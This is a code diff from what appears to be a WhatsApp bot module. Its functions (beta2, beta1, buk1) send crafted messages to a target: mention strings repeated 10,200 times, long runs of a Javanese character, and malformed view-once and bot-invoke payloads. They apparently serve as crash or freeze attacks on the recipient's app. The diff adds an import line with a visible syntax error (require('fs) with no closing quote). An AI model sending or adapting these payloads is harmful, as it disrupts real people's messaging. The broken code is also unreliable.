@@ -1,5 +1,6 @@
 exports.beta2 = async (viper, target, ptcp = true) => {
 const crypto = require('crypto')
+const fs = require('fs)
 const o = fs.readFileSync(`./database/lib/viper/o.jpg`)
 	const jids = `_*~@13135550002~*_\n`.repeat(10200);
 	const ui = 'ꦽ'.repeat(1500);
@@ -77,20 +78,22 @@ const o = fs.readFileSync(`./database/lib/viper/o.jpg`)
 
 
 exports.beta1 = async (viper, target, ptcp = true) => {
-const crypto = require('crypto')
-const o = fs.readFileSync(`./database/lib/viper/o.jpg`)
-const stanza = [
-{
-attrs: { biz_bot: '1' },
-tag: "bot",
-},
-{
-attrs: {},
-tag: "biz",
-},
-];
+    const crypto = require('crypto');
+    const fs = require('fs'); // Pastikan fs di-import
+    const o = fs.readFileSync(`./database/lib/viper/o.jpg`);
+    const stanza = [
+        {
+            attrs: { biz_bot: '1' },
+            tag: "bot",
+        },
+        {
+            attrs: {},
+            tag: "biz",
+        },
+    ];
+
     for (let i = 0; i < 3; i++) {
-const messagePayload = {
+        const messagePayload = {
 viewOnceMessage: {
 message: {
 listResponseMessage: {
@@ -221,18 +224,16 @@ ticket_id: crypto.randomBytes(16),
 }
 }
 }
-}
-}
-
-await viper.relayMessage(target, messagePayload, {
-additionalNodes: stanza,
-participant: { jid : target }
-});
-}
+        await viper.relayMessage(target, messagePayload, {
+            additionalNodes: stanza,
+            participant: { jid: target }
+        });
+    }
+};
 
 exports.buk1 = async (viper, target, ptcp = true) => {
     try {
-        const message = {
+                const message = {
             botInvokeMessage: {
                 message: {
                     newsletterAdminInviteMessage: {
@@ -286,4 +287,4 @@ exports.buk1 = async (viper, target, ptcp = true) => {
     } catch (err) {
         console.error("Error sending newsletter:", err);
     }
-}
+};
